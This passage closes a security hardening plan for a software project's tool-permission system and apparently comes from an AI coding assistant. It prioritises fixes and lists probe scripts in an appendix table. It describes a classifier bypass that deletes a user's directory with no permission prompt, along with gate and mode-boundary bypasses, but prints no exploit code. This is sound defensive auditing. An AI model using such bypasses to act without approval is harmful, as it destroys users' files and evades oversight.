Add ~2 days if the live-driver harness is promoted to a committed test with a stubbed model call
for CI and a real one for the paid pass. That item is not in the ranking above because it is
infrastructure rather than a floor, but it is the only thing that would give the **Core→Shell
direction** — 14 of 56 protocol methods, with **no test reference of any kind**, and almost exactly
the outbound set — its first automated exercise.

### If only a fraction gets done

**If there is time for exactly one item: H1.** It is the only item on this list where the failure
is *already reachable on today's build*, there is a working reproduction, and the consequence —
a user's files deleted with no prompt — is outside the rollback floor and therefore permanent. It
is also the item whose absence best illustrates the standard: 658 passing tests, a subsystem with a
dedicated 36-entry classification table, and a one-minute probe deleted a directory with zero cards.

**If three: H1, H3, H5** (classifier, dev-only boundary, G2 repo-wide). All three share a shape —
the invariant is real, the prose is confident, and the enforcement is a convention that the next
tool will not inherit. They are the three places where the repo is relying on the *next* author
remembering something.

**If five: add H2 and H4.** H2 because a G1 breach ships green and the fix is already written and
proven. H4 because the spec calls it the most important test in the codebase and it currently
tests presence rather than substance — and step 2 is about to lean on it.

**If the answer is "none of it right now": do the G4 xfail (1 hour) and the review-checklist line
(free).** Both are cheap, neither blocks anything, and together they stop the two floors that are
about to become load-bearing from landing untested.

---

## Appendix — probe scripts

All runnable, repo untouched. Under
`/private/tmp/claude-501/-Users-karel-Desktop-Addison/9ae359b3-3378-4b59-ac12-07f3565cbcb3/scratchpad/hardening/`:

| Path | What it demonstrates |
|---|---|
| `verify/classifier_e2e.py` | **The live bug.** Real gate → real execute, deletes a throwaway dir with 0 cards |
| `verify/undo_substance.py` | No-op and non-callable `undo` both register at HIGH |
| `classifier/probe.py`, `classifier/e2e.py` | Original classifier bypass discovery |
| `modeleak/probe.py` | `is_dev_only` dead code; a `dev_only` tool reachable under SAFE |
| `gate/probe.py` | Turn-denial bypass, `revoke` no-op on auto-grant, SAFE `detail` loss |
| `registry/noop.py` | Undo-check presence-vs-substance |
| `widget/probe.py` | Widget validation fail-closed (clean — no findings) |
| `rust/mutate.py`, `rust/fixed/` | 23 Rust mutations; **the proven keychain fix** |
| `frontend/src/__tests__/proposed.permissionCard.test.tsx` | 5 tests, 3 failing against the real component |
| `mutation/`, `mut/`, `probes/` | The Python mutation harnesses and results |

*Note: scratchpad paths are session-scoped and will not persist. If this plan is adopted, the
mutation catalogue (§7.2) is the artifact that should be committed — not these scripts.*
